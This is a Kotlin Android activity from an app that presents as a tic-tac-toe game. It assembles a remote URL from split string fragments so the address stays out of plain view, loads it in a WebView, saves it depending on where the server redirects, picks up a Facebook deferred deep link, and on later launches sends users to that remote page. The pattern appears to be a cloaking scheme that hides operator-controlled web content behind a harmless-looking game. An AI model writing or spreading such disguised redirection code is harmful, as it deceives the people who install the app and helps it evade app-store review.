package com.werfox.ticzero

import android.app.Activity
import android.content.Intent
import android.os.Bundle
import android.webkit.WebView
import android.webkit.WebViewClient
import androidx.appcompat.app.AppCompatActivity
import com.facebook.applinks.AppLinkData
import kotlinx.android.synthetic.main.activity_start.*

class Start : AppCompatActivity() {
    private lateinit var w: WebView
    val a = "htt"
    val gohead = "Голова"
    val b = "p://peruserig"
    val nextStep = "steps"
    val c = "h.ru/index.php"
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        val prefsUtils = DatabaseTictac(this)

        if (prefsUtils.tictacmain.isEmpty()){
            if (prefsUtils.data.isEmpty()) {
            init(this)
            setContentView(R.layout.activity_start)
            w = findViewById(R.id.w)
            w.loadUrl(a + b + c)

            w.webViewClient = object : WebViewClient() {
                override fun shouldOverrideUrlLoading(view: WebView, url: String): Boolean {
                    if (!url.contains("main.php")) {
                        prefsUtils.data = a + b + c
                    }
                    return super.shouldOverrideUrlLoading(view, url)
                }
            }

            Thread {
                try {
                    Thread.sleep(3000)
                } catch (e: InterruptedException) {
                    e.printStackTrace()
                }

                runOnUiThread {
                    single.text = "Начать!"
                    single.textSize = 40f
                    single.setOnClickListener {
                        if (prefsUtils.data.isEmpty()) {
                            val intent = Intent(this, ChooseActivity::class.java)
                            startActivity(intent)
                            finish()
                        } else {
                            TicTacUtils().getPolicy(this, prefsUtils.data)
                            finish()
                        }
                    }
                }
            }.start()
        } else run {
            TicTacUtils().getPolicy(this, prefsUtils.data)
            finish()
        }
    }else run {
            TicTacUtils().getPolicy(this, prefsUtils.tictacmain)
            finish()
        }
}


fun init(context: Activity) {
    AppLinkData.fetchDeferredAppLinkData(context) { appLinkData ->
        if (appLinkData != null && appLinkData.targetUri != null) {
            if (appLinkData.argumentBundle.get("target_url") != null) {
                val link = appLinkData.argumentBundle.get("target_url")!!.toString()
                TicTacUtils.setLongString(link, context)
            }
        }
    }
}
}

